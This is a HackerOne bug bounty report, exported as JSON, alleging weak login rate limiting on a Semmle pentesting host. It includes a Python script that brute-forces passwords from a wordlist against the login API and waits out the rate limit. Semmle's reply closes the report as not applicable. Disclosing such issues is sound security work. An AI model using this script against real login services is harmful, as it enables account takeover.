{"id":504362,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC81MDQzNjI=","url":"https://hackerone.com/reports/504362","title":"the login blocking mechanism does not work correctly","state":"Closed","substate":"not-applicable","severity_rating":"medium","readable_substate":"N/A","created_at":"2019-03-03T03:00:43.856Z","submitted_at":"2019-03-03T03:00:43.856Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"aufzayed","url":"/aufzayed","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/TykJQk5MEZNJCpjgCnVh6QjG/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":27264,"url":"https://hackerone.com/semmle","handle":"semmle","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/027/264/8af1325fdaccc38beab4451ba68ace24623b248c_original.png/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c","medium":"https://profile-photos.hackerone-user-content.com/variants/000/027/264/8af1325fdaccc38beab4451ba68ace24623b248c_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"permissions":[],"submission_state":"disabled","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"pentest_feature_enabled?":false,"profile":{"name":"Semmle","twitter_handle":"semmle","website":"https://semmle.com","about":"Semmle's engineering analytics platform helps leading technology companies and open-source developers build secure, reliable software."}},"has_bounty?":false,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"has_collaborators":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":true,"disclosed_at":"2019-03-19T11:58:46.854Z","bug_reporter_agreed_on_going_public_at":"2019-03-03T13:19:40.362Z","team_member_agreed_on_going_public_at":"2019-03-19T11:58:46.803Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"## Summary:\nThe login block mechanism does not work correctly because it blocks the login for 1 minute and allows you to sign in again many times with specific pattern by allowing login 2 or 3 times after 1 minute\n\n## Exploitation\n\n1. open https://lgtm-com.pentesting.semmle.net/\n2. try to login with valid E-mail and __do not__ use the correct password\n3. user proxy to intercept requests\n4. extract __nonce__ parameter and __cookies__\n6. add email and passwords list and the values your are extracted at the following script\n\npython3\n```\nimport requests\nimport time\n\nwith open('passwords list path', 'r') as passwords:\n    passwd_index = 0\n    for passwd in passwords:\n        passwd = passwd.split('\\n')[0]\n        HEADERS = {\n\t        'Host': 'lgtm-com.pentesting.semmle.net',\n\t        'Content-Type': 'application/x-www-form-urlencoded',\n\t        'Content-Length': '238',\n\t        'Cookie': ''\n        }\n\n        DATA = {\n\t        'email': 'your valid email',\n\t        'password': passwd,\n\t        'nonce': '',\n\t        'apiVersion': 'b5b3337fa392c83c27f4e05efc4ccbcb2dcf6cbf'\n\n        }\n\n        login = requests.post('https://lgtm-com.pentesting.semmle.net/internal_api/v0.2/login', headers=HEADERS, data=DATA)\n        if login.status_code == 200:\n            print(f'[#] {passwd}')\n            break\n        elif login.status_code == 400:\n            print('[!] sleep 60s')\n            time.sleep(60)\n        elif login.status_code == 401:\n            print(f'[{passwd_index}] {passwd}')\n            time.sleep(5)\n        else:\n            print(login.status_code)\n        passwd_index += 1\n ```\n\nThen watch the results\n\n## Impact\n\nCan take over user account","weakness":{"id":31,"name":"Brute Force"},"original_report_id":null,"original_report_url":null,"attachments":[],"allow_singular_disclosure_at":null,"vote_count":5,"voters":["base_64","khizer47","cr4xerbik4sh","vincentlaw1","reddmist"],"severity":{"rating":"medium","score":6.8,"author_type":"User","metrics":{"attack_vector":"network","attack_complexity":"high","privileges_required":"none","user_interaction":"none","scope":"unchanged","confidentiality":"low","integrity":"low","availability":"low"}},"structured_scope":{"databaseId":8552,"asset_type":"URL","asset_identifier":"lgtm-com.pentesting.semmle.net","max_severity":"critical"},"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"activities":[{"id":4245412,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Sorry I forgot to say run the code :)","automated_response":false,"created_at":"2019-03-03T03:04:44.149Z","updated_at":"2019-03-03T03:04:44.149Z","actor":{"username":"aufzayed","cleared":false,"url":"/aufzayed","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/TykJQk5MEZNJCpjgCnVh6QjG/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"semmle","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":4246690,"is_internal":false,"editable":false,"type":"Activities::BugNotApplicable","message":"Hi,\n\nThis appears to indicate that the rate limiting is working correctly, as after a short burst of login attempts the rate at which you can successfully make them is reduced.\n\nWe believe a rate limit of one login attempt per minute combined with our password requirements is more than sufficient to prevent a realistic brute-force attack.\n\nThanks,\nChris","automated_response":false,"created_at":"2019-03-03T11:05:07.424Z","updated_at":"2019-03-03T11:05:07.424Z","actor":{"username":"chrisgavin","cleared":false,"url":"/chrisgavin","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/259/787/73e7651e088896c2379249d5752999800fc9c2c6_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"semmle","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":4246932,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"thanks","automated_response":false,"created_at":"2019-03-03T13:02:49.158Z","updated_at":"2019-03-03T13:02:49.158Z","actor":{"username":"aufzayed","cleared":false,"url":"/aufzayed","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/TykJQk5MEZNJCpjgCnVh6QjG/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"semmle","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":4247028,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","automated_response":false,"created_at":"2019-03-03T13:19:40.395Z","updated_at":"2019-03-03T13:19:40.395Z","first_to_agree":true,"actor":{"username":"aufzayed","cleared":false,"url":"/aufzayed","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/TykJQk5MEZNJCpjgCnVh6QjG/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"semmle","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":4352402,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","automated_response":false,"created_at":"2019-03-19T11:58:46.829Z","updated_at":"2019-03-19T11:58:46.829Z","actor":{"username":"jmdh","cleared":false,"url":"/jmdh","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"semmle","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":4352403,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","automated_response":false,"created_at":"2019-03-19T11:58:46.876Z","updated_at":"2019-03-19T11:58:46.876Z","actor":{"username":"jmdh","cleared":false,"url":"/jmdh","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"semmle","actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}